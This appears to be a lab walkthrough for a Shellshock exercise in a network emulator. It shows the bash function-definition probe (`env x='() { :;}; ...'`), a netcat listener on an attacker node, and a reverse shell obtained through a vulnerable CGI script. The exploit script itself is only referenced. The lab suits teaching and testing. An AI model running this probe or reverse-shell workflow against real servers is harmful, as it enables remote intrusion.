# Shellshock attack

## Starting the vulnerable server
Start the experiment specified in `service.imn` and issue the
[start_http.sh](start_http.sh) command to start the http server and deploy a
vulnerable version of bash on the host node:
```console
# ./start_https.sh
```
After executing the command check with the `ps` command whether the http server
is running on the host node.
```console
root@host:/ # ps ax
 PID TT  STAT    TIME COMMAND
  9733 ??  IsJ  0:00.00 rpcbind
  9735 ??  IsJ  0:00.00 inetd
  9895 ??  SJ   0:00.00 lighttpd -f /usr/local/etc/lighttpd/lighttpd.conf
  9897  2  SJ   0:00.01 csh
  9911  2  R+J  0:00.00 ps ax
```
You can also sheck whether the vulnerable bash version is deployed on the host:
```console
root@host:/ # bash
[root@host /]# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
vulnerable
this is a test
```
The same procedure on the PC node should result in the following output:
```console
root@PC:/ # bash
[root@PC /]# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
```

## Executing the attack
First we start a `netcat` process on the Attacker that will listen for incoming
connections:
```console
root@Attacker:/ # nc -l 8080
```
After the process is started we execute the [shellshock.sh](shellshock.sh)
script that will exploit the shellshock vulnerability to give a simple reverse
TCP shell to the Attacker on TCP port 8080.

```console
# ./shellshock.sh
```

After the execution the `netcat` process will get the reverse shell:
```console
root@Attacker:/ # nc -l 8080
bash: no job control in this shell
[www@host /root/www.host]$ ls
ls
form.sh
freebsd.gif
index.html
[www@host /root/www.host]$ 
```
The attack exploits the simple [form.sh](www.host/form.sh) script, but the
attack would be the same for any bash script that is executed as CGI if the bash
executable is vulnerable (version < bash43-027).
